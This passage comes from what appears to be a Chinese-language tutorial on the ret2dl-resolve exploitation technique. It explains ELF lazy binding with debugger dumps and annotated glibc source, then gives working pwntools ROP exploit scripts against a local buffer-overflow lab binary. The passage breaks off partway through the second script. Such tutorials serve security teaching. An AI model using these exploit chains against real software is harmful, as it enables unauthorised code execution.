LOCAL  DEFAULT    5</span><br><span class="line">     6: 08048278     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 080482e4     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     8: 080482f8     0 SECTION LOCAL  DEFAULT    8</span><br><span class="line">     9: 08048318     0 SECTION LOCAL  DEFAULT    9</span><br><span class="line">    10: 08048330     0 SECTION LOCAL  DEFAULT   10</span><br><span class="line">    11: 08048358     0 SECTION LOCAL  DEFAULT   11</span><br><span class="line">    12: 08048380     0 SECTION LOCAL  DEFAULT   12</span><br><span class="line">    13: 080483e0     0 SECTION LOCAL  DEFAULT   13</span><br><span class="line">    14: 080483f0     0 SECTION LOCAL  DEFAULT   14</span><br><span class="line">    15: 08048634     0 SECTION LOCAL  DEFAULT   15</span><br><span class="line">    16: 08048648     0 SECTION LOCAL  DEFAULT   16</span><br><span class="line">    17: 08048650     0 SECTION LOCAL  DEFAULT   17</span><br><span class="line">    18: 08048684     0 SECTION LOCAL  DEFAULT   18</span><br><span class="line">    19: 08049f08     0 SECTION LOCAL  DEFAULT   19</span><br><span class="line">    20: 08049f0c     0 SECTION LOCAL  DEFAULT   20</span><br><span class="line">    21: 08049f10     0 SECTION LOCAL  DEFAULT   21</span><br><span class="line">    22: 08049f14     0 SECTION LOCAL  DEFAULT   22</span><br><span class="line">    23: 08049ffc     0 SECTION LOCAL  DEFAULT   23</span><br><span class="line">    24: 0804a000     0 SECTION LOCAL  DEFAULT   24</span><br><span class="line">    25: 0804a020     0 SECTION LOCAL  DEFAULT   25</span><br><span class="line">    26: 0804a040     0 SECTION LOCAL  DEFAULT   26</span><br><span class="line">    27: 00000000     0 SECTION LOCAL  DEFAULT   27</span><br><span class="line">    28: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    29: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_LIST__</span><br><span class="line">    30: 08048430     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones</span><br><span class="line">    31: 08048460     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones</span><br><span class="line">    32: 080484a0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux</span><br><span class="line">    33: 0804a048     1 OBJECT  LOCAL  DEFAULT   26 completed.7209</span><br><span class="line">    34: 08049f0c     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin</span><br><span class="line">    35: 080484c0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy</span><br><span class="line">    36: 08049f08     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_</span><br><span class="line">    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS bof.c</span><br><span class="line">    38: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    39: 08048774     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__</span><br><span class="line">    40: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_END__</span><br><span class="line">    41: 00000000     0 FILE    LOCAL  DEFAULT  ABS</span><br><span class="line">    42: 08049f0c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end</span><br><span class="line">    43: 08049f14     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC</span><br><span class="line">    44: 08049f08     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start</span><br><span class="line">    45: 08048650     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR</span><br><span class="line">    46: 0804a000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    47: 08048630     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini</span><br><span class="line">    48: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@@GLIBC_2.0</span><br><span class="line">    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class="built_in">read</span>@@GLIBC_2.0</span><br><span class="line">    50: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab</span><br><span class="line">    51: 08048420     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx</span><br><span class="line">    52: 0804a020     0 NOTYPE  WEAK   DEFAULT   25 data_start</span><br><span class="line">    53: 080484eb    52 FUNC    GLOBAL DEFAULT   14 vuln</span><br><span class="line">    54: 0804a028     0 NOTYPE  GLOBAL DEFAULT   25 _edata</span><br><span class="line">    55: 08048634     0 FUNC    GLOBAL DEFAULT   15 _fini</span><br><span class="line">    56: 0804a020     0 NOTYPE  GLOBAL DEFAULT   25 __data_start</span><br><span class="line">    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    58: 0804a024     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle</span><br><span class="line">    59: 0804864c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br><span class="line">    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.0</span><br><span class="line">    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_</span><br><span class="line">    62: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@@GLIBC_2.0</span><br><span class="line">    63: 080485d0    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init</span><br><span class="line">    64: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@@GLIBC_2.0</span><br><span class="line">    65: 0804a04c     0 NOTYPE  GLOBAL DEFAULT   26 _end</span><br><span class="line">    66: 080483f0     0 FUNC    GLOBAL DEFAULT   14 _start</span><br><span class="line">    67: 08048648     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw</span><br><span class="line">    68: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@@GLIBC_2.0</span><br><span class="line">    69: 0804a028     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start</span><br><span class="line">    70: 0804851f   165 FUNC    GLOBAL DEFAULT   14 main</span><br><span class="line">    71: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses</span><br><span class="line">    72: 0804a028     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__</span><br><span class="line">    73: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">    74: 08048358     0 FUNC    GLOBAL DEFAULT   11 _init</span><br></pre></td></tr></table></figure>
<p><code>.dynstr</code>节包含了动态链接的字符串。这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/12s 0x08048278</span><br><span class="line">0x8048278:	&quot;&quot;</span><br><span class="line">0x8048279:	&quot;libc.so.6&quot;</span><br><span class="line">0x8048283:	&quot;_IO_stdin_used&quot;</span><br><span class="line">0x8048292:	&quot;stdin&quot;</span><br><span class="line">0x8048298:	&quot;strlen&quot;</span><br><span class="line">0x804829f:	&quot;read&quot;</span><br><span class="line">0x80482a4:	&quot;stdout&quot;</span><br><span class="line">0x80482ab:	&quot;setbuf&quot;</span><br><span class="line">0x80482b2:	&quot;__libc_start_main&quot;</span><br><span class="line">0x80482c4:	&quot;write&quot;</span><br><span class="line">0x80482ca:	&quot;__gmon_start__&quot;</span><br><span class="line">0x80482d9:	&quot;GLIBC_2.0&quot;</span><br></pre></td></tr></table></figure>
<p><code>Elf32_Sym[2]-&gt;st_name=0x27</code>（<code>.dynsym + Elf32_Sym_size * num</code>），所以<code>.dynstr</code>加上<code>0x27</code>的偏移量，就是字符串<code>read</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/wx 0x080481d8+0x10*2</span><br><span class="line">0x80481f8:	0x00000027</span><br><span class="line">assassinq&gt;&gt; x/s 0x08048278+0x27</span><br><span class="line">0x804829f:	&quot;read&quot;</span><br></pre></td></tr></table></figure>
<p><code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置（<code>.plt + Elf32_Sym_size * num</code>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/3i 0x08048380+0x10*2</span><br><span class="line">   0x80483a0 &lt;read@plt&gt;:	jmp    DWORD PTR ds:0x804a010</span><br><span class="line">   0x80483a6 &lt;read@plt+6&gt;:	push   0x8</span><br><span class="line">   0x80483ab &lt;read@plt+11&gt;:	jmp    0x8048380</span><br></pre></td></tr></table></figure>
<h2 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h2><p>在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定</p>
<p>当程序执行<code>call read@plt</code>时，实际会跳到<code>0x804a010</code>去执行。而<code>0x080483a0</code>处的汇编代码仅仅三行，第一行中<code>0x804a010</code>为<code>read</code>的 GOT 表位置，第一次调用<code>read</code>时，对应的 GOT 表中并没有放<code>read</code>的真实地址，而是<code>read@plt</code>的下一条指令地址；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/wx 0x804a010</span><br><span class="line">0x804a010:	0x080483a6</span><br></pre></td></tr></table></figure>
<p>第二行和第三行把<code>reloc_arg=0x8</code>作为参数放进栈里，然后跳到<code>0x8048380</code>（<code>PLT[0]</code>）继续执行；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/2i 0x080483a6</span><br><span class="line">   0x80483a6 &lt;read@plt+6&gt;:	push   0x8</span><br><span class="line">   0x80483ab &lt;read@plt+11&gt;:	jmp    0x8048380</span><br></pre></td></tr></table></figure>
<p>接下来<code>PLT[0]</code>再把<code>link_map=*(GOT+4)</code>（即<code>GOT[1]</code>，链接器的标识信息）作为参数推入栈中，而<code>*(GOT+8)</code>（即<code>GOT[2]</code>，动态链接器中的入口点）中保存的是<code>_dl_runtime_resolve</code>函数的地址；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/2i 0x8048380</span><br><span class="line">   0x8048380:	push   DWORD PTR ds:0x804a004</span><br><span class="line">   0x8048386:	jmp    DWORD PTR ds:0x804a008</span><br></pre></td></tr></table></figure>
<p>因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的<code>read</code>函数地址写入其<code>GOT</code>条目中，随后把控制权交给<code>read</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/wx 0x804a008</span><br><span class="line">0x804a008:	0xf7fee000</span><br><span class="line">assassinq&gt;&gt; x/11i 0xf7fee000</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;:	push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;:	push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;:	push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;:	mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;:	mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;:	call   0xf7fe77e0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;:	pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;:	mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;:	ret    0xc</span><br></pre></td></tr></table></figure>
<p><code>_dl_fixup</code>在<a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a>中实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">  ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">  struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line">  <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></span><br><span class="line"><span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not used don't look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">      version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">      <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */</span></span><br><span class="line">    <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">    <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">      flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">      THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* Currently result contains the base load address (or link map) of the object that defines sym.  Now add in the symbol offset.  */</span></span><br><span class="line"><span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load address) is also known.  */</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">    result = l;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwned-One-by-One"><a href="#Pwned-One-by-One" class="headerlink" title="Pwned One by One"></a>Pwned One by One</h1><ol>
<li>控制<code>eip</code>为<code>PLT[0]</code>的地址，只需传递一个<code>index_arg</code>参数</li>
<li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址（比如<code>.bss</code>段）内</li>
<li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址（比如<code>.bss</code>段）内</li>
<li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址（比如<code>.bss</code>段）内</li>
<li>伪造<code>name</code>为任意库函数，比如说<code>system</code></li>
</ol>
<p>接下来一步一步地实现对<code>dl-resolve</code>的利用</p>
<h2 id="Step-one"><a href="#Step-one" class="headerlink" title="Step one"></a>Step one</h2><p>先实现一个 ROP 直接返回<code>write@plt</code>，然后输出我们设定的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * offset,</span><br><span class="line">	read_plt,</span><br><span class="line">	pop_pop_pop_ret,</span><br><span class="line">	<span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf - <span class="number">4</span>,</span><br><span class="line">	leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">payload = flat([</span><br><span class="line">	write_plt,</span><br><span class="line">	<span class="number">0xdeadbeef</span>,</span><br><span class="line">	<span class="number">1</span>, buf + <span class="number">80</span>, len(cmd)</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后会输出<code>buf + 80</code>上的字符串<code>/bin/sh</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 7067</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="Step-Two"><a href="#Step-Two" class="headerlink" title="Step Two"></a>Step Two</h2><p>第二次直接返回<code>PLT[0]</code>，要带上<code>write</code>的<code>index_offset</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">	<span class="string">'A'</span> * offset,</span><br><span class="line">	read_plt,</span><br><span class="line">	pop_pop_pop_ret,</span><br><span class="line">	<span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">	pop_ebp_ret,</span><br><span class="line">	buf - <span class="number">4</span>,</span><br><span class="line">	leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span 